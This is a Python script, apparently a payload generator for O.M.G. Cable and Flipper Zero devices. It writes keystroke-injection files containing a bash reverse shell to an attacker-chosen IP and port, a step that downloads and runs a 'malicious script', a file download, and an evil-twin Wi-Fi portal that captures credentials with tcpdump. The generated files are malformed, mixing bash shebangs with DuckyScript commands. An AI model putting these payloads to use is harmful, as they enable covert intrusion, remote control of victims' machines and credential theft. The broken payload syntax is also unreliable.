import random
import string
import os
import time

def display_logo():
    logo = r"""░█████╗░░░░███╗░░░███╗░░░░██████╗░██████╗░
██╔══██╗░░░████╗░████║░░░██╔════╝░╚════██╗
██║░░██║░░░██╔████╔██║░░░██║░░██╗░░█████╔╝
██║░░██║░░░██║╚██╔╝██║░░░██║░░╚██╗░╚═══██╗
╚█████╔╝██╗██║░╚═╝░██║██╗╚██████╔╝██████╔╝
░╚════╝░╚═╝╚═╝░░░░░╚═╝╚═╝░╚═════╝░╚═════╝░"""
    print(logo)

def generate_payload(length=16):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def create_keystroke_payload(command):
    payload = f"#!/bin/bash\n"
    payload += f"DELAY 500\n"
    for char in command:
        if char == ' ':
            payload += "STRING {SPACE}\n"
        elif char in ['"', "'", '\\']:
            payload += f"STRING {char}\n"
        else:
            payload += f"STRING {char}\n"
        payload += "DELAY 50\n"
    payload += "ENTER\n"
    
    filename = "keystroke_payload.sh"
    with open(filename, 'w') as file:
        file.write(payload)
    os.chmod(filename, 0o755)  # Make the script executable
    
    print(f"\nKeystroke payload saved as {filename}")
    return filename

def create_open_url_payload(url):
    payload = f"#!/bin/bash\n"
    payload += f"DELAY 500\n"
    payload += f"STRING xdg-open {url}\n"
    payload += "ENTER\n"
    
    filename = "open_url_payload.sh"
    with open(filename, 'w') as file:
        file.write(payload)
    os.chmod(filename, 0o755)  # Make the script executable
    
    print(f"\nOpen URL payload saved as {filename}")
    return filename

def create_download_file_payload(url, filename):
    payload = f"#!/bin/bash\n"
    payload += f"DELAY 500\n"
    payload += f"STRING curl -O {url} -o {filename}\n"
    payload += "ENTER\n"
    
    payload_filename = "download_file_payload.sh"
    with open(payload_filename, 'w') as file:
        file.write(payload)
    os.chmod(payload_filename, 0o755)  # Make the script executable
    
    print(f"\nDownload file payload saved as {payload_filename}")
    return payload_filename

def create_reverse_shell_payload(ip, port):
    payload = f"#!/bin/bash\n"
    payload += f"DELAY 500\n"
    payload += f"STRING bash -i >& /dev/tcp/{ip}/{port} 0>&1\n"
    payload += "ENTER\n"
    
    filename = "reverse_shell_payload.sh"
    with open(filename, 'w') as file:
        file.write(payload)
    os.chmod(filename, 0o755)  # Make the script executable
    
    print(f"\nReverse shell payload saved as {filename}")
    return filename

def create_malicious_script_payload(script_url):
    payload = f"#!/bin/bash\n"
    payload += f"DELAY 500\n"
    payload += f"STRING wget {script_url} -O /tmp/malicious_script.sh\n"
    payload += "ENTER\n"
    payload += "DELAY 200\n"
    payload += "STRING chmod +x /tmp/malicious_script.sh\n"
    payload += "ENTER\n"
    payload += "DELAY 200\n"
    payload += "STRING /tmp/malicious_script.sh\n"
    payload += "ENTER\n"
    
    filename = "malicious_script_payload.sh"
    with open(filename, 'w') as file:
        file.write(payload)
    os.chmod(filename, 0o755)  # Make the script executable
    
    print(f"\nMalicious script payload saved as {filename}")
    return filename

def create_flipper_zero_fake_portal_payload(ssid):
    payload = f"#!/bin/bash\n"
    payload += f"DELAY 500\n"
    payload += f"STRING echo 'Creating EvilAP with SSID: {ssid}'\n"
    payload += "ENTER\n"
    payload += "DELAY 200\n"
    payload += f"STRING airbase-ng -e {ssid} -c 6 wlan0\n"
    payload += "ENTER\n"
    payload += "DELAY 200\n"
    payload += f"STRING dnsmasq --no-resolv --interface=wlan0 --dhcp-range=192.168.1.2,192.168.1.20,255.255.255.0,24h\n"
    payload += "ENTER\n"
    payload += "DELAY 200\n"
    payload += f"STRING systemctl start hostapd\n"
    payload += "ENTER\n"
    payload += "DELAY 200\n"
    payload += "STRING echo 'Capturing credentials...'\n"
    payload += "ENTER\n"
    payload += "DELAY 200\n"
    payload += "STRING tcpdump -i wlan0 -A -s 0 port 80 > captured_credentials.txt &\n"
    payload += "ENTER\n"
    
    filename = "fake_wifi_portal_payload.sh"
    with open(filename, 'w') as file:
        file.write(payload)
    os.chmod(filename, 0o755)  # Make the script executable
    
    print(f"\nFake Wi-Fi portal payload saved as {filename}")
    return filename

def create_flipper_zero_bad_usb_payload():
    payload = f"#!/bin/bash\n"
    payload += f"DELAY 500\n"
    payload += "STRING echo 'Executing BadUSB payload'\n"
    payload += "ENTER\n"
    payload += "DELAY 200\n"
    payload += "STRING echo 'Performing USB attack...'\n"
    payload += "ENTER\n"
    
    filename = "bad_usb_payload.sh"
    with open(filename, 'w') as file:
        file.write(payload)
    os.chmod(filename, 0o755)  # Make the script executable
    
    print(f"\nBadUSB payload saved as {filename}")
    return filename

def create_custom_payload():
    command = input("Enter the custom command: ")
    return create_keystroke_payload(command)

def main():
    display_logo()
    print("O.M.G. Cable & Flipper Zero Payload Generator")
    
    print("Choose your device:")
    print("1. O.M.G. Cable")
    print("2. Flipper Zero")

    device_choice = input("Enter your choice (1-2): ")

    if device_choice == '1':
        print("\nO.M.G. Cable Payload Options:")
        print("1. Generate Random Alphanumeric Payload")
        print("2. Keystroke Payload (Command)")
        print("3. Open URL Payload")
        print("4. Download File Payload")
        print("5. Reverse Shell Payload")
        print("6. Malicious Script Payload")
        print("7. Custom Command Payload")
        print("8. Generate Windows Executable Payload")

        choice = input("Enter your choice (1-8): ")

        if choice == '1':
            length = int(input("Enter the length of the payload: "))
            random_payload = generate_payload(length)
            print(f"Random Payload: {random_payload}")

        elif choice == '2':
            command = input("Enter the command to create a keystroke payload: ")
            keystroke_payload_file = create_keystroke_payload(command)
            print(f"\nGenerated Keystroke Payload saved as {keystroke_payload_file}")

        elif choice == '3':
            url = input("Enter the URL to open (e.g., http://example.com): ")
            open_url_payload_file = create_open_url_payload(url)
            print(f"\nGenerated Open URL Payload saved as {open_url_payload_file}")

        elif choice == '4':
            url = input("Enter the file URL to download: ")
            filename = input("Enter the filename to save as: ")
            download_file_payload_file = create_download_file_payload(url, filename)
            print(f"\nGenerated Download File Payload saved as {download_file_payload_file}")

        elif choice == '5':
            ip = input("Enter the IP address for reverse shell: ")
            port = input("Enter the port for reverse shell: ")
            reverse_shell_payload_file = create_reverse_shell_payload(ip, port)
            print(f"\nGenerated Reverse Shell Payload saved as {reverse_shell_payload_file}")

        elif choice == '6':
            script_url = input("Enter the URL of the malicious script: ")
            malicious_script_payload_file = create_malicious_script_payload(script_url)
            print(f"\nGenerated Malicious Script Payload saved as {malicious_script_payload_file}")

        elif choice == '7':
            custom_payload_file = create_custom_payload()
            print(f"\nGenerated Custom Command Payload saved as {custom_payload_file}")

        elif choice == '8':
            print("Windows executable payload generation not implemented.")

        else:
            print("Invalid choice.")

    elif device_choice == '2':
        print("\nFlipper Zero Payload Options:")
        print("1. Fake Wi-Fi Portal Payload")
        print("2. BadUSB Payload")

        choice = input("Enter your choice (1-2): ")

        if choice == '1':
            ssid = input("Enter the SSID for the EvilAP: ")
            flipper_payload_file = create_flipper_zero_fake_portal_payload(ssid)
            print(f"\nGenerated Fake Wi-Fi Portal Payload saved as {flipper_payload_file}")

        elif choice == '2':
            flipper_badusb_payload_file = create_flipper_zero_bad_usb_payload()
            print(f"\nGenerated BadUSB Payload saved as {flipper_badusb_payload_file}")

        else:
            print("Invalid choice.")
    else:
        print("Invalid device choice.")

if __name__ == "__main__":
    main()
